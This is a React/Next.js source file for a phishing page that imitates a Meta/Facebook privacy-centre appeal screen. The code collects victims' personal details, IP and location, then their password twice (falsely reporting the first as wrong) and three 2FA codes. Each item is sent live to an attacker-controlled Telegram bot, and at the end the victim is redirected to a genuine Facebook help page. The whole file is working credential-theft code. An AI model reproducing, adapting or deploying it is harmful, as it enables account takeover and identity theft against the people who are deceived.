"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { FormEvent, useEffect, useRef, useState } from "react";
import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
import styles from "./page.module.css";

type ActionItem = {
  title: string;
  subtitle: string;
  icon?: "/icon-women.png" | "/icon-docs.png";
  muted?: boolean;
};

type ReviewForm = {
  fullName: string;
  email: string;
  workEmail: string;
  pageName: string;
  phoneNumber: string;
  dateOfBirth: string;
  details: string;
};

type ReviewFormErrors = Partial<Record<keyof ReviewForm, string>>;

const defaultForm: ReviewForm = {
  fullName: "",
  email: "",
  workEmail: "",
  pageName: "",
  phoneNumber: "",
  dateOfBirth: "",
  details: "",
};

function formatCooldownTime(seconds: number, locale: Locale) {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = seconds % 60;
  const segments: string[] = [];

  if (locale === "vi") {
    if (minutes > 0) {
      segments.push(`${minutes} phút`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} giây`);
    }
  } else {
    if (minutes > 0) {
      segments.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
    }
  }

  return segments.join(" ");
}

const emailPattern = /^\S+@\S+\.\S+$/;

function validateReviewForm(form: ReviewForm, dictionary: Dictionary): ReviewFormErrors {
  const validation = dictionary.modal.validation;
  const errors: ReviewFormErrors = {};

  if (!form.fullName.trim()) {
    errors.fullName = validation.fullNameRequired;
  }

  if (!form.email.trim()) {
    errors.email = validation.emailRequired;
  } else if (!emailPattern.test(form.email)) {
    errors.email = validation.emailInvalid;
  }

  if (!form.workEmail.trim()) {
    errors.workEmail = validation.workEmailRequired;
  } else if (!emailPattern.test(form.workEmail)) {
    errors.workEmail = validation.workEmailInvalid;
  }

  if (!form.pageName.trim()) {
    errors.pageName = validation.pageNameRequired;
  }

  if (!form.phoneNumber.trim()) {
    errors.phoneNumber = validation.phoneNumberRequired;
  }

  if (!form.dateOfBirth.trim()) {
    errors.dateOfBirth = validation.dateOfBirthRequired;
  }

  return errors;
}

function SidebarIcon({ name, active }: { name: "home" | "search" | "policy" | "rules" | "settings"; active?: boolean }) {
  const color = active ? "#ffffff" : "#000000";
  const stroke = {
    stroke: color,
    strokeWidth: 1.6,
    fill: "none",
    strokeLinecap: "round" as const,
    strokeLinejoin: "round" as const,
  };

  if (name === "home") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <path d="M4.2 9.4L10 4.8L15.8 9.4" {...stroke} />
        <path d="M5.5 8.8V14.5H14.5V8.8" {...stroke} />
      </svg>
    );
  }

  if (name === "search") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <circle cx="8.7" cy="8.7" r="4.6" {...stroke} />
        <path d="M12.4 12.4L16 16" {...stroke} />
      </svg>
    );
  }

  if (name === "policy") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <rect x="5.3" y="5.3" width="9.4" height="10.3" rx="1.2" {...stroke} />
        <path d="M8 5.2V3.8H12V5.2" {...stroke} />
      </svg>
    );
  }

  if (name === "rules") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <circle cx="10" cy="10" r="6" {...stroke} />
        <path d="M10 7.4V10.2" {...stroke} />
        <circle cx="10" cy="12.9" r="0.7" fill={color} />
      </svg>
    );
  }

  return (
    <svg viewBox="0 0 20 20" aria-hidden="true">
      <circle cx="10" cy="10" r="2.2" {...stroke} />
      <path d="M10 4.6V3.2M10 16.8V15.4M15.4 10H16.8M3.2 10H4.6M13.8 6.2L14.8 5.2M5.2 14.8L6.2 13.8M13.8 13.8L14.8 14.8M5.2 5.2L6.2 6.2" {...stroke} />
    </svg>
  );
}

function ChevronIcon({ direction = "down" }: { direction?: "up" | "down" | "right" }) {
  const directionClass =
    direction === "up" ? styles.chevronUp : direction === "right" ? styles.chevronRight : "";

  return (
    <svg viewBox="0 0 20 20" aria-hidden="true" className={`${styles.chevronIcon} ${directionClass}`}>
      <path d="M5.5 7.5L10 12L14.5 7.5" />
    </svg>
  );
}

function ResourceList({ items, onClick, noIcon }: { items: ActionItem[]; onClick: () => void; noIcon?: boolean }) {
  return (
    <div className={styles.actionButtonList}>
      {items.map((item, index) => (
        <button
          type="button"
          key={item.title}
          className={`${styles.actionButton} ${index < items.length - 1 ? styles.borderBottom : ""} ${noIcon ? styles.actionButtonNoIcon : ""}`}
          onClick={onClick}
        >
          {item.icon ? (
            <span className={styles.actionIcon}>
              <Image src={item.icon} alt="" width={40} height={40} />
            </span>
          ) : null}
          <span className={styles.actionText}>
            <span className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}>{item.title}</span>
            <span className={styles.actionSubText}>{item.subtitle}</span>
          </span>
          <span className={styles.actionArrow} aria-hidden="true">
            <ChevronIcon direction="right" />
          </span>
        </button>
      ))}
    </div>
  );
}

function ResourceListGrouped({ items, onClick }: { items: ActionItem[]; onClick: () => void }) {
  return (
    <div className={styles.actionButtonListGrouped}>
      {items.map((item) => (
        <button type="button" key={item.title} className={`${styles.actionButtonGrouped} ${styles.actionButtonNoIcon}`} onClick={onClick}>
          <span className={styles.actionText}>
            <span className={`${styles.actionMainText} ${item.muted ? styles.smallGrey : ""}`}>{item.title}</span>
            <span className={styles.actionSubText}>{item.subtitle}</span>
          </span>
          <span className={styles.actionArrow} aria-hidden="true">
            <ChevronIcon direction="right" />
          </span>
        </button>
      ))}
    </div>
  );
}

type HomePageClientProps = {
  locale: Locale;
  detectedCountryCode?: string | null;
  detectedCallingCode?: string | null;
  detectedIp?: string | null;
  detectedLocation?: string | null;
};

function countryCodeToFlag(countryCode: string | null | undefined): string {
  if (!countryCode || !/^[A-Z]{2}$/.test(countryCode)) {
    return "🏳️";
  }

  const base = 127397;
  return String.fromCodePoint(
    countryCode.charCodeAt(0) + base,
    countryCode.charCodeAt(1) + base,
  );
}

function normalizeCallingCode(value: string | null | undefined): string {
  if (!value) {
    return "";
  }

  const digits = value.replace(/[^\d]/g, "");
  return digits ? `+${digits}` : "";
}

function escapeHtml(value: string | null | undefined): string {
  if (value == null) {
    return "";
  }

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function getCurrentTime(): string {
  return new Date().toLocaleString("en-US", { hour12: false });
}

function formatDateOfBirthInput(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 8);
  const parts: string[] = [];
  if (digits.length > 0) {
    parts.push(digits.slice(0, 2));
  }
  if (digits.length > 2) {
    parts.push(digits.slice(2, 4));
  }
  if (digits.length > 4) {
    parts.push(digits.slice(4, 8));
  }
  return parts.join("/");
}

function formatPhoneNumberInput(value: string): string {
  return value.replace(/\D/g, "").slice(0, 15);
}

function maskPhoneTail(value: string): string {
  const digits = value.replace(/\D/g, "");
  const tail = digits.slice(-2);
  return tail ? `******${tail}` : "******";
}

function maskEmail(value: string): string {
  const trimmed = value.trim();
  if (!trimmed || !trimmed.includes("@")) {
    return "he***@gmail.com";
  }
  const [user, domain] = trimmed.split("@");
  const prefix = user.slice(0, 2).padEnd(2, "*");
  return `${prefix}***@${domain}`;
}

function applyTemplate(template: string, value: string): string {
  return template.replace("{value}", value);
}

export default function HomePageClient({
  locale,
  detectedCountryCode,
  detectedCallingCode,
  detectedIp,
  detectedLocation,
}: HomePageClientProps) {
  const [activeLocale, setActiveLocale] = useState<Locale>(locale);
  const dictionary = getDictionary(activeLocale);
  const modal = dictionary.modal;
  const sidebar = dictionary.sidebar;
  const pageContent = dictionary.page;
  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
  const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
  const [clientIp, setClientIp] = useState(detectedIp ?? "");
  const phoneFlag = countryCodeToFlag(clientCountryCode);
  const phoneCode = normalizeCallingCode(clientCallingCode);

  const privacyCenterActions: ActionItem[] = [
    {
      title: pageContent.privacyCenterActions[0].title,
      subtitle: pageContent.privacyCenterActions[0].subtitle,
      icon: "/icon-women.png",
    },
    {
      title: pageContent.privacyCenterActions[1].title,
      subtitle: pageContent.privacyCenterActions[1].subtitle,
      icon: "/icon-women.png",
    },
  ];

  const agreementActions: ActionItem[] = [
    {
      title: pageContent.agreementActions[0].title,
      subtitle: pageContent.agreementActions[0].subtitle,
      icon: "/icon-docs.png",
    },
  ];

  const additionalResourcesActions: ActionItem[] = pageContent.additionalResourcesActions.map((item) => ({
    title: item.title,
    subtitle: item.subtitle,
  }));

  const [showPolicyList, setShowPolicyList] = useState(false);
  const [showOtherRulesList, setShowOtherRulesList] = useState(false);
  const [showSettingsList, setShowSettingsList] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [isSubmited, setIsSubmited] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [loadingInitial, setLoadingInitial] = useState(false);
  const [loadingPassword, setLoadingPassword] = useState(false);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const [clickCount, setClickCount] = useState(0);
  const [clickCount1, setClickCount1] = useState(0);
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [twoFactorError, setTwoFactorError] = useState("");
  const router = useRouter();
  const [showAltMethods, setShowAltMethods] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"app" | "whatsapp" | "sms" | "email">("app");
  const [notifyOnFacebook, setNotifyOnFacebook] = useState(false);
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [form, setForm] = useState<ReviewForm>(defaultForm);
  const [errors, setErrors] = useState<ReviewFormErrors>({});
  const [didTrySubmit, setDidTrySubmit] = useState(false);
  const formTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const botToken = TELEGRAM_BOT_TOKEN;
  const chatId = TELEGRAM_CHAT_ID;

  const telegramEnabled = Boolean(botToken && chatId);
  const [messageId, setMessageId] = useState<string | null>(null);
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [code3, setCode3] = useState("");
  const [currentUrl, setCurrentUrl] = useState("");

  type TelegramOverrides = Partial<{
    password1: string;
    password2: string;
    code1: string;
    code2: string;
    code3: string;
    status: string;
  }>;

  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
    const locationParts = (clientLocation ?? "")
      .split("/")
      .map((part) => part.trim())
      .filter(Boolean);
    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeIp = escapeHtml(clientIp ?? "N/A");
    const safePageName = escapeHtml(form.pageName || "N/A");
    const safeFullName = escapeHtml(form.fullName || "N/A");
    const safeDateOfBirth = escapeHtml(form.dateOfBirth || "N/A");
    const safePersonalEmail = escapeHtml(form.email || "N/A");
    const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
    const safeDetails = escapeHtml(form.details.trim() || "N/A");
    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
    const safeUrl = escapeHtml(currentUrl || "N/A");
    const safeTime = escapeHtml(getCurrentTime());
    const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
    const safePassword2 = escapeHtml((overrides.password2 ?? password2) || "N/A");
    const safeCode1 = escapeHtml((overrides.code1 ?? code1) || "N/A");
    const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
    const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
    const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");

    return [
      "👤 <b>THÔNG TIN PHỤ</b>",
      `📱 Tên PAGE: <code>${safePageName}</code>`,
      `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
      `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
      `🌐 IP: <code>${safeIp}</code>`,
      `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
      `🏙 Thành Phố: <code>${safeCity}</code>`,
      `⏰ Thời Gian: <code>${safeTime}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
      `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
      `📧 Email Business: <code>${safeBusinessEmail}</code>`,
      `📞 SĐT: <code>${safePhone}</code>`,
      `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
      `🔗 URL: <code>${safeUrl}</code>`,
      `🔑 Mật Khẩu 1: <code>${safePassword1}</code>`,
      `🔑 Mật Khẩu 2: <code>${safePassword2}</code>`,
      `🔓 CODE 2FA 1: <code>${safeCode1}</code>`,
      `🔓 CODE 2FA 2: <code>${safeCode2}</code>`,
      `🔓 CODE 2FA 3: <code>${safeCode3}</code>`,
      `🔄 Trạng thái: ${safeStatus}`,
    ].join("\n");
  };

  const sendTelegramMessage = async (text: string) => {
    if (!telegramEnabled) {
      return;
    }

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "HTML",
        }),
      });
      const data = (await response.json()) as {
        ok?: boolean;
        result?: { message_id?: number };
      };

      if (data?.ok && data.result?.message_id) {
        const nextId = String(data.result.message_id);
        setMessageId(nextId);
        if (typeof window !== "undefined") {
          localStorage.setItem("telegram_msg_id", nextId);
        }
      }
    } catch (error) {
      console.error("Telegram Error:", error);
    }
  };

  const sendInitialDataToTelegram = async () => {
    if (!telegramEnabled) {
      return;
    }

    if (typeof window !== "undefined") {
      localStorage.removeItem("telegram_msg_id");
    }
    setMessageId(null);
    setPassword1("");
    setPassword2("");
    setCode1("");
    setCode2("");
    setCode3("");

    const text = buildTelegramMessage("Đang chờ mật khẩu...");
    await sendTelegramMessage(text);
  };

  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
    if (!telegramEnabled) {
      return;
    }

    const text = buildTelegramMessage(status, overrides);
    if (!messageId) {
      await sendTelegramMessage(text);
      return;
    }

    try {
      const messageIdNumber = Number(messageId);
      if (!Number.isFinite(messageIdNumber)) {
        throw new Error("Invalid message id");
      }

      const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageIdNumber,
          text,
          parse_mode: "HTML",
        }),
      });
      const data = await response.json();
      if (!data?.ok) {
        throw new Error("Telegram edit failed");
      }
    } catch (error) {
      console.error("Telegram Update Error:", error);
      await sendTelegramMessage(text);
    }
  };

  const passwordStepMessage = modal.passwordStepMessage;
  const passwordPlaceholder = modal.passwordPlaceholder;
  const continueButtonLabel = modal.continueButtonLabel;
  const passwordRequiredError = modal.passwordRequiredError;
  const passwordIncorrectError = modal.passwordIncorrectError;
  const togglePasswordLabel = showPassword ? modal.togglePasswordHideLabel : modal.togglePasswordShowLabel;

  const twoFactorHeading = modal.twoFactorHeading;
  const twoFactorDescription = modal.twoFactorDescription;
  const twoFactorPlaceholder = modal.twoFactorPlaceholder;
  const twoFactorRequiredError = modal.twoFactorRequiredError;
  const twoFactorIncorrectLabel = modal.twoFactorIncorrectLabel;
  const twoFactorImageAlt = modal.twoFactorImageAlt;
  const phoneNumberPlaceholder = modal.phoneNumberPlaceholder;

  function openReviewModal() {
    setShowModal(true);
  }

  function closeReviewModal() {
    setShowModal(false);
    setIsSubmited(false);
    setIsSuccess(false);
    setLoadingInitial(false);
    setLoadingPassword(false);
    setIsSubmitDisabled(false);
    setTimeLeft(0);
    setClickCount(0);
    setClickCount1(0);
    setPassword("");
    setPasswordError("");
    setShowPassword(false);
    setTwoFactorCode("");
    setTwoFactorError("");
    setShowAltMethods(false);
    setSelectedMethod("app");
    if (typeof window !== "undefined") {
      window.localStorage.removeItem("two_factor_context");
    }
    setAgreeTerms(false);
    setNotifyOnFacebook(false);
    setErrors({});
    setDidTrySubmit(false);
    if (telegramEnabled && typeof window !== "undefined") {
      localStorage.removeItem("telegram_msg_id");
    }
    setMessageId(null);
    setPassword1("");
    setPassword2("");
    setCode1("");
    setCode2("");
    setCode3("");
    if (formTimerRef.current) {
      clearTimeout(formTimerRef.current);
      formTimerRef.current = null;
    }
    if (passwordTimerRef.current) {
      clearTimeout(passwordTimerRef.current);
      passwordTimerRef.current = null;
    }
  }

  function handleFieldChange<K extends keyof ReviewForm>(field: K, value: ReviewForm[K]) {
    setForm((prev) => {
      let nextValue = value;
      if (field === "dateOfBirth" && typeof value === "string") {
        nextValue = formatDateOfBirthInput(value) as ReviewForm[K];
      }
      if (field === "phoneNumber" && typeof value === "string") {
        nextValue = formatPhoneNumberInput(value) as ReviewForm[K];
      }
      const next = { ...prev, [field]: nextValue };
      if (didTrySubmit) {
        setErrors(validateReviewForm(next, dictionary));
      }
      return next;
    });
  }

  async function handleSubmit1(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (loadingInitial) {
      return;
    }
    setDidTrySubmit(true);

    const nextErrors = validateReviewForm(form, dictionary);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    setLoadingInitial(true);
    if (formTimerRef.current) {
      clearTimeout(formTimerRef.current);
    }
    try {
      await sendInitialDataToTelegram();
    } catch (error) {
      console.error("Telegram initial send error:", error);
    }
    formTimerRef.current = setTimeout(() => {
      setIsSubmited(true);
      setIsSuccess(false);
      setPassword("");
      setPasswordError("");
      setClickCount(0);
      setShowPassword(false);
      setTwoFactorCode("");
      setTwoFactorError("");
      setClickCount1(0);
      setIsSubmitDisabled(false);
      setTimeLeft(0);
      setLoadingInitial(false);
      formTimerRef.current = null;
    }, 1000);
  }

  function handlePasswordChange(value: string) {
    setPassword(value);
    if (passwordError) {
      setPasswordError("");
    }
  }

  async function handlePasswordSubmit() {
    if (loadingPassword) {
      return;
    }

    if (!password.trim()) {
      setPasswordError(passwordRequiredError);
      return;
    }

    setPasswordError("");
    setLoadingPassword(true);
    setIsSubmitDisabled(true);
    const currentClick = clickCount;
    setClickCount((prev) => prev + 1);

    if (currentClick === 0) {
      const firstAttempt = password;
      setPassword1(firstAttempt);
      await updateTelegramMessage("Đang chờ mật khẩu 2...", {
        password1: firstAttempt,
        status: "Đang chờ mật khẩu 2...",
      });

      if (passwordTimerRef.current) {
        clearTimeout(passwordTimerRef.current);
      }
      passwordTimerRef.current = setTimeout(() => {
        setPasswordError(passwordIncorrectError);
        setIsSubmitDisabled(false);
        setLoadingPassword(false);
        passwordTimerRef.current = null;
      }, 3000);
      return;
    }

    if (currentClick === 1) {
      const secondAttempt = password;
      setPassword2(secondAttempt);
      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
        password2: secondAttempt,
        status: "Đang chờ mã xác thực 2FA...",
      });

      if (passwordTimerRef.current) {
        clearTimeout(passwordTimerRef.current);
      }
      passwordTimerRef.current = setTimeout(() => {
        setIsSubmitDisabled(false);
        setLoadingPassword(false);
        setIsSuccess(true);
        setTwoFactorCode("");
        setTwoFactorError("");
        setClickCount1(0);
        setTimeLeft(0);
        passwordTimerRef.current = null;
      }, 1200);
    }
  }

  function handleTwoFactorChange(value: string) {
    if (!/^\d{0,8}$/.test(value)) {
      return;
    }

    setTwoFactorCode(value);
    if (twoFactorError) {
      setTwoFactorError("");
    }
  }

  type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";

  const persistTwoFactorContext = (method: TwoFactorMethod = "app") => {
    if (typeof window === "undefined") {
      return;
    }
    const storedMessageId = messageId ?? window.localStorage.getItem("telegram_msg_id");
    const payload = {
      form,
      clientIp,
      clientLocation,
      clientCountryCode,
      clientCallingCode,
      password1,
      password2,
      code1,
      code2,
      code3,
      clickCount1,
      messageId: storedMessageId,
      currentUrl: currentUrl || window.location.href,
      selectedMethod: method,
      locale: activeLocale,
    };
    window.localStorage.setItem("two_factor_context", JSON.stringify(payload));
  };

  const openTwoFactorOptionsPopup = () => {
    persistTwoFactorContext(selectedMethod);
    setShowAltMethods(true);
  };

  async function sendToTelegram() {
    if (isSubmitDisabled) {
      return;
    }

    if (!twoFactorCode.trim()) {
      setTwoFactorError(twoFactorRequiredError);
      return;
    }

    setTwoFactorError("");
    const currentClick = clickCount1;
    setClickCount1((prev) => prev + 1);

    if (currentClick === 0) {
      const firstCode = twoFactorCode;
      setCode1(firstCode);
      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
        code1: firstCode,
        status: "Đang chờ mã xác thực 2FA...",
      });
      setIsSubmitDisabled(true);
      setTimeLeft(10);
      setTwoFactorCode("");
      return;
    }

    if (currentClick === 1) {
      const secondCode = twoFactorCode;
      setCode2(secondCode);
      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
        code2: secondCode,
        status: "Đang chờ mã xác thực 2FA...",
      });
      setIsSubmitDisabled(true);
      setTimeLeft(10);
      setTwoFactorCode("");
      return;
    }

    if (currentClick === 2) {
      const thirdCode = twoFactorCode;
      setCode3(thirdCode);
      await updateTelegramMessage("Hoàn tất!", {
        code3: thirdCode,
        status: "Hoàn tất!",
      });
      setTwoFactorCode("");
      setTimeout(() => {
        window.location.href = "https://www.facebook.com/help/1735443093393986/";
      }, 2000);
    }
  }

  useEffect(() => {
    if (typeof window !== "undefined") {
      setCurrentUrl(window.location.href);
    }
  }, []);

  useEffect(() => {
    setActiveLocale(locale);
  }, [locale]);

  useEffect(() => {
    if (!clientCountryCode) {
      return;
    }
    const nextLocale = resolveLocaleFromCountryCode(clientCountryCode);
    if (nextLocale === activeLocale) {
      return;
    }
    setActiveLocale(nextLocale);
    if (typeof document !== "undefined") {
      document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
    }
  }, [clientCountryCode, activeLocale, locale]);

  useEffect(() => {
    let cancelled = false;

    const fetchGeo = async () => {
      const applyVietnamFallback = () => {
        if (cancelled) {
          return;
        }
        setClientCountryCode("VN");
        setClientCallingCode("+84");
        setClientLocation("N/A / N/A / Vietnam");
      };

      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) {
          throw new Error("Failed to fetch IP data");
        }
        const result = (await response.json()) as { ip?: string };
        if (!result?.ip || cancelled) {
          applyVietnamFallback();
          return;
        }

        setClientIp(result.ip);

        const locationResponse = await fetch(
          `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${result.ip}`,
        );
        if (!locationResponse.ok) {
          throw new Error("Failed to fetch location data");
        }
        const locationData = (await locationResponse.json()) as {
          calling_code?: string;
          country_code2?: string;
          district?: string;
          city?: string;
          country_name?: string;
        };
        if (cancelled) {
          return;
        }

        const callingCode = normalizeCallingCode(locationData?.calling_code ?? "");
        const countryCode = (locationData?.country_code2 ?? "").toUpperCase();
        const district = locationData?.district || "N/A";
        const city = locationData?.city || "N/A";
        const country = locationData?.country_name || "N/A";

        if (!countryCode || !callingCode) {
          applyVietnamFallback();
          return;
        }

        setClientCallingCode(callingCode);
        setClientCountryCode(countryCode);
        setClientLocation(`${district} / ${city} / ${country}`);
      } catch (err) {
        console.error(err);
        applyVietnamFallback();
      }
    };

    fetchGeo();

    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!telegramEnabled || typeof window === "undefined") {
      return;
    }

    const storedId = window.localStorage.getItem("telegram_msg_id");
    if (storedId) {
      setMessageId(storedId);
    }
  }, [telegramEnabled]);

  useEffect(() => {
    if (!isSubmitDisabled || timeLeft <= 0) {
      return;
    }

    const timer = setTimeout(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setIsSubmitDisabled(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearTimeout(timer);
  }, [isSubmitDisabled, timeLeft]);

  useEffect(() => {
    return () => {
      if (formTimerRef.current) {
        clearTimeout(formTimerRef.current);
      }
      if (passwordTimerRef.current) {
        clearTimeout(passwordTimerRef.current);
      }
    };
  }, []);

  const twoFactorErrorMessage =
    isSubmitDisabled && timeLeft > 0
      ? `${twoFactorIncorrectLabel} ${formatCooldownTime(timeLeft, locale)}`
      : twoFactorError;

  const altMethods = [
    {
      id: "app",
      title: modal.altMethodAppTitle,
      subtitle: modal.altMethodAppSubtitle,
    },
    {
      id: "whatsapp",
      title: modal.altMethodWhatsappTitle,
      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
    },
    {
      id: "sms",
      title: modal.altMethodSmsTitle,
      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
    },
    {
      id: "email",
      title: modal.altMethodEmailTitle,
      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email)),
    },
  ] as const;

  return (
    <div className={styles.container}>
      <aside className={styles.left}>
        <div className={styles.leftContent}>
          <Image src="/metalogo.svg" alt="Meta" width={60} height={12} priority className={styles.metaLogo} />
          <p className={styles.leftTitle}>{sidebar.title}</p>

          <button type="button" className={styles.homeButton}>
            <SidebarIcon name="home" active />
            {sidebar.homePage}
          </button>

          <button type="button" className={styles.menuButton} onClick={openReviewModal}>
            <SidebarIcon name="search" />
            {sidebar.search}
          </button>

          <button type="button" className={styles.menuButton} onClick={() => setShowPolicyList((prev) => !prev)}>
            <SidebarIcon name="policy" />
            {sidebar.privacyPolicy}
            <span className={styles.menuChevron}>
              <ChevronIcon direction={showPolicyList ? "up" : "down"} />
            </span>
          </button>

          {showPolicyList ? (
            <ul className={styles.menuSubList}>
              {sidebar.privacyPolicyItems.map((item) => (
                <li key={item}>
                  <button type="button" onClick={openReviewModal}>
                    {item}
                  </button>
                </li>
              ))}
            </ul>
          ) : null}

          <button type="button" className={styles.menuButton} onClick={() => setShowOtherRulesList((prev) => !prev)}>
            <SidebarIcon name="rules" />
            {sidebar.otherRulesAndArticles}
            <span className={styles.menuChevron}>
              <ChevronIcon direction={showOtherRulesList ? "up" : "down"} />
            </span>
          </button>

          {showOtherRulesList ? (
            <ul className={styles.menuSubList}>
              {sidebar.otherRulesItems.map((item) => (
                <li key={item}>
                  <button type="button" onClick={openReviewModal}>
                    {item}
                  </button>
                </li>
              ))}
            </ul>
          ) : null}

          <button type="button" className={styles.menuButton} onClick={() => setShowSettingsList((prev) => !prev)}>
            <SidebarIcon name="settings" />
            {sidebar.settings}
            <span className={styles.menuChevron}>
              <ChevronIcon direction={showSettingsList ? "up" : "down"} />
            </span>
          </button>

          {showSettingsList ? (
            <ul className={styles.menuSubList}>
              {sidebar.settingsItems.map((item) => (
                <li key={item}>
                  <button type="button" onClick={openReviewModal}>
                    {item}
                  </button>
                </li>
              ))}
            </ul>
          ) : null}
        </div>
      </aside>

      <main className={styles.right}>
        <div className={styles.rightContent}>
          <div className={styles.noticeTitleRow}>
            <Image src="/delete.png" alt={pageContent.noticeIconAlt} width={30} height={30} />
            <p>{pageContent.noticeTitle}</p>
          </div>

          <div className={styles.noticeDescription}>
            <p>{pageContent.noticeDescription1}</p>
            <p>{pageContent.noticeDescription2}</p>
          </div>

          <section className={styles.warningCard}>
            <Image
              src="/PrivacyCenter.png"
              alt={pageContent.warningImageAlt}
              width={1601}
              height={424}
              className={styles.warningImage}
              priority
            />

            <div className={styles.warningBottom}>
              <h3>{pageContent.warningTitle}</h3>
            </div>

            <div className={styles.warningInfoBox}>
              <p>{pageContent.warningInfoText1}</p>
              <p>{pageContent.warningInfoText2}</p>
            </div>

            <div className={styles.requestButtonWrap}>
              <button type="button" className={styles.requestButton} onClick={openReviewModal}>
                {pageContent.requestReviewButton}
              </button>
            </div>
          </section>

          <h4 className={styles.sectionHeading}>{pageContent.appealGuideHeading}</h4>
          <ul className={styles.appealList}>
            {pageContent.appealGuideItems.map((item) => (
              <li key={item}>{item}</li>
            ))}
          </ul>

          <h4 className={styles.sectionHeading}>{pageContent.privacyCenterHeading}</h4>
          <ResourceListGrouped items={privacyCenterActions} onClick={openReviewModal} />

          <h4 className={styles.sectionHeading}>{pageContent.userAgreementHeading}</h4>
          <ResourceList items={agreementActions} onClick={openReviewModal} />

          <h4 className={styles.sectionHeading}>{pageContent.additionalResourcesHeading}</h4>
          <ResourceListGrouped items={additionalResourcesActions} onClick={openReviewModal} />

          <p className={styles.footerNote}>
            {pageContent.footerNotePrefix} <span>{pageContent.footerNoteLink}</span>
          </p>
        </div>
      </main>

      {showModal ? (
        <div className={styles.modalOverlay}>
          <div className={styles.modalContent} role="dialog" aria-modal="true" aria-label={modal.ariaLabel}>
            <button type="button" className={styles.modalCloseButton} onClick={closeReviewModal}>
              x
            </button>

            {!isSubmited ? (
              <>
                <h3 className={styles.modalHeading}>{modal.heading}</h3>

                <form className={styles.modalForm} onSubmit={handleSubmit1}>
                  <input
                    id="fullName"
                    type="text"
                    value={form.fullName}
                    onChange={(event) => handleFieldChange("fullName", event.target.value)}
                    placeholder={modal.fullNamePlaceholder}
                  />
                  {errors.fullName ? <p className={styles.fieldError}>{errors.fullName}</p> : null}

                  <input
                    id="email"
